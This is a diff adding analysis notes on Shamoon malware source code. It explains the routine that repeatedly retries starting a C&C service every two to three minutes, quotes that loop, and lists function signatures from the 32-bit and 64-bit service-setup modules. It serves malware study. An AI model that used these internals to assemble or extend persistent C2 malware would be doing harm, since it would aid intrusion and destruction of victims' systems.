@@ -55,3 +55,43 @@ M_STRING02(lpszFileName,
 		return false;
 	```
   returning false if the service cannot be ran and true otherwise.
+  
+  In the last function, the goal is contacting the C2 server which will then allow the attacker to have full control and communication with the infected target.
+  
+  The code loops until the C2 service has been started, waiting for a few minutes in between calls to start the service
+  ```
+  // Thread sleep for 2~3 minutes
+	SvcSleep(Shamoon::Utils::GetRandom() % 60 + 120);
+	
+	// The routine loops until the service has been sucessfully started
+	while(!bSvcStopped)
+	{
+		// Macro to enter and leave critical section
+		SYSTEM_CRITICAL_SECTION(
+			// Try to run the C&C service
+			RunC2Service(L"1");
+		)
+		
+		// Thread sleep for 2~3 minutes
+		SvcSleep(Shamoon::Utils::GetRandom() % 60 + 120);
+	}
+	
+	return 0;
+```
+
+## 64bit.cpp & 32bit.cpp
+These two files allow for the retrieval of information specific to both 32 bit and 64 bit machines, thus allowing for a greater scope of attack. The 32bit.cpp file is much more involved than the 64bit file, with the functions
+```
+bool Shamoon::Modules::_32bit::Start32bitService(LPCWSTR lpMachineName, const WCHAR *a2)
+
+bool Shamoon::Modules::_32bit::Get32bitSpecific(WCHAR *szSvcName, WCHAR *szSvcPath)
+
+bool Shamoon::Modules::_32bit::Save32bitModule()
+
+bool Shamoon::Modules::_32bit::Setup32bitService()
+```
+
+Whereas 64bit has only 
+```
+bool Shamoon::Modules::_64bit::Get64bitSpecific(WCHAR *szSvcName, WCHAR *szSvcPath)
+```
